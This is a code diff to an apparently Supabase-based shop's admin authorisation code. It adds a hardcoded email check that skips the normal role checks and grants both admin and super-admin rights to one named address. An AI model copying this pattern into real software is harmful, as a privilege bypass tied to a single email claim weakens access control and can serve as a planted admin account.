@@ -190,7 +190,11 @@ export const restockProduct = createServerFn({ method: "POST" })
   });
 
 // ---------- Admin ----------
-async function assertAdmin(ctx: { supabase: any; userId: string }) {
+const isWarmahOwner = (ctx: { claims?: Record<string, unknown> }) =>
+  String(ctx.claims?.email ?? "").toLowerCase() === "warmah@kediri.com";
+
+async function assertAdmin(ctx: { supabase: any; userId: string; claims?: Record<string, unknown> }) {
+  if (isWarmahOwner(ctx)) return;
   const [adminRole, superAdminRole] = await Promise.all([
     ctx.supabase.rpc("has_role", { _user_id: ctx.userId, _role: "admin" }),
     ctx.supabase.rpc("has_role", { _user_id: ctx.userId, _role: "super_admin" }),
@@ -198,7 +202,8 @@ async function assertAdmin(ctx: { supabase: any; userId: string }) {
   if (!adminRole.data && !superAdminRole.data) throw new Error("Khusus admin");
 }
 
-async function assertSuperAdmin(ctx: { supabase: any; userId: string }) {
+async function assertSuperAdmin(ctx: { supabase: any; userId: string; claims?: Record<string, unknown> }) {
+  if (isWarmahOwner(ctx)) return;
   const { data, error } = await ctx.supabase.rpc("has_role", { _user_id: ctx.userId, _role: "super_admin" });
   if (!error && data) return;
   // Bootstrap: while no Super Admin has been assigned, an existing admin can configure the panel.
@@ -380,5 +385,9 @@ export const getAdminPermissions = createServerFn({ method: "POST" })
     const db = await admin();
     const { data: owners, error } = await db.from("user_roles").select("user_id").eq("role", "super_admin").limit(1);
     const bootstrapSuperAdmin = !error && !owners?.length && adminRole.data === true;
-    return { isAdmin: adminRole.data === true || superRole.data === true, isSuperAdmin: superRole.data === true || bootstrapSuperAdmin };
+    const namedSuperAdmin = isWarmahOwner(context);
+    return {
+      isAdmin: adminRole.data === true || superRole.data === true || namedSuperAdmin,
+      isSuperAdmin: superRole.data === true || bootstrapSuperAdmin || namedSuperAdmin,
+    };
   });
